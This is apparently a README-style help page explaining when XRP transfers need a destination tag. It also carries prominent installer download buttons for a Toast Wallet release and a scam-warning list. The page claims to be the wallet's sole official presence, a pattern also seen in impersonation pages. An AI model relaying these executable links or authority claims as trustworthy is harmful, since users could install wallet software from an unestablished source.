<div align="center">

# Do You Need a Destination Tag From Toast Wallet?

**When you do, and don't, need a destination tag.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **This GitHub organization is the only official presence for Toast Wallet — there is no official website.**
> `toastwallet.app` is a known phishing clone impersonating one; see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

This single field causes more failed and "lost" XRP transfers than almost anything else in the
withdrawal process — and the answer depends entirely on *where you're sending to*.

**What a destination tag actually is.** On the XRP Ledger, a destination tag is a short number
that identifies a specific sub-account or purpose *within* a single shared address. Exchanges use
one address for thousands of customers, and use destination tags to know which deposit belongs to
which user — without the correct tag, the exchange has no way to credit the funds to your account
specifically, even though the XRP itself arrived at their address.

**When you need one:**
- Sending **to an exchange** (Coinbase, Binance, Kraken, etc.) — almost always required. The
  exchange will display both an address and a tag on its deposit screen; you need both.
- Sending **to another shared/custodial wallet service** — check that service's deposit
  instructions specifically.

**When you don't need one:**
- Sending **to your own non-custodial wallet** (like Xaman/XUMM, a hardware wallet, or another
  Toast Wallet address) — these typically use one unique address per user, so no tag is needed.
  Adding one anyway is usually harmless but unnecessary.

**Does Toast Wallet itself require a destination tag to receive funds?** No — a standard Toast
Wallet address does not require a destination tag for someone to send *to* it, because each Toast
Wallet address is unique to you, not shared. You only need to *provide* one when sending *out* to a
destination that requires it.

**If you already sent funds without a required tag:** the XRP usually still arrives at the
receiving service's address, but may not be automatically credited to your account. This is not
something fixable from the Toast Wallet side — you'll need to contact the receiving exchange's
support directly with your transaction hash (found in your Toast Wallet transaction history or on
a ledger explorer like xrpscan.com) and ask them to manually credit the deposit. Response times
vary by exchange.

For the full send process end to end, see our
[guide to sending XRP to Coinbase or Binance](./toast-wallet-to-coinbase-binance.md).

---

## ⚠️ Known Scams — Do Not Use These

- **The "Toast Plus" fraudulent app** (App Store / Google Play, package `co.peninsulasoftware.toastwallet`) — a lookalike app, not affiliated with Toast Wallet, that has stolen an estimated **$5M+ in XRP**. Full details: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **The toastwallet.app phishing site** — a clone of the official recovery page that drains any wallet imported into it. Full details: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **Marketing clone sites** — `xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`. Not official, and misrepresent how Toast Wallet actually works.
- **Paid "recovery service" DMs** — always a follow-up scam; no one can reverse an XRP Ledger transaction.

See the [full Toast Wallet scam warning list](./toast-wallet-scam-warning-list.md). If you believe you've been scammed, file a report at [ic3.gov](https://www.ic3.gov).

## Related Articles

- [Sending XRP to Coinbase or Binance](./toast-wallet-to-coinbase-binance.md)
- [How to Move XRP Out of Toast Wallet](./how-to-move-xrp-out-of-toast-wallet.md)
- [Toast Wallet Scam Warning List](./toast-wallet-scam-warning-list.md)
